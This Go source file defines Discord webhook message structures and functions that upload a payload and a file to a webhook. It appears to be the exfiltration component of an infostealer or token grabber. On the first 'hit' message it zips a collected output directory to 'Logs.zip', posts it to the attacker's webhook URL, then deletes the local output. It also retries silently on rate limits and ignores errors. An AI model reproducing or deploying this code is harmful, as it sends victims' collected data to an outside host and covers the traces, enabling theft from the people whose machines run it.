package main

import (
	"bytes"
	"encoding/json"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

type Image struct {
	Url string `json:"url"`
}

type Field struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type Footer struct {
	Text     string `json:"text"`
	Icon_url string `json:"icon_url"`
}

type Embed struct {
	Title       string    `json:"title"`
	Url         string    `json:"url"`
	Description string    `json:"description"`
	Color       int       `json:"color"`
	Thumbnail   Image     `json:"thumbnail"`
	Footer      Footer    `json:"footer"`
	Fields      []Field   `json:"fields"`
	Timestamp   time.Time `json:"timestamp"`
	Author      Author    `json:"author"`
	Image       Image     `json:"image"`
}

type Author struct {
	Name     string `json:"name"`
	Icon_URL string `json:"icon_url"`
	Url      string `json:"url"`
}

type MessageStructure struct {
	Username   string  `json:"username"`
	Avatar_url string  `json:"avatar_url"`
	Content    string  `json:"content"`
	Embeds     []Embed `json:"embeds"`
}

// send To Discord Webhook
func PostJSON(link string, data []byte, filePath string) {
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	// Add the message content
	err := w.WriteField("payload_json", string(data))
	if err != nil {
		return
	}

	// If filePath has been passed, add the file to the request
	if filePath != "" {
		file, _ := os.Open(filePath)
		defer file.Close()

		fw, err := w.CreateFormFile("file", filepath.Base(filePath))
		if err != nil {
			return
		}
		io.Copy(fw, file)
	}

	w.Close()

	req, err := http.NewRequest("POST", link, &b)
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req) // Make request
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 { // Hit Rate limit...
		time.Sleep(time.Second * 5)    // Wait and -
		PostJSON(link, data, filePath) // Send request again
	}
}

func SendEmbed(embeds Embed, fileAttached bool) {
	// Create message and payload structure, then execute webhook request
	var filePath = ""

	hook := MessageStructure{
		Username:   webhookName,
		Avatar_url: embedImage,
		Embeds:     []Embed{embeds},
	}

	if fileAttached { // aka first embed being sent
		hook.Content = hitMessage
		if ZipDirectory() == nil { // Output directory has been zipped to Logs.zip successfully
			filePath = outputZip
		}
	}

	payload, _ := json.Marshal(hook)

	PostJSON(webhookUrl, payload, filePath)

	if fileAttached {
		DeleteOutput()
	}
}
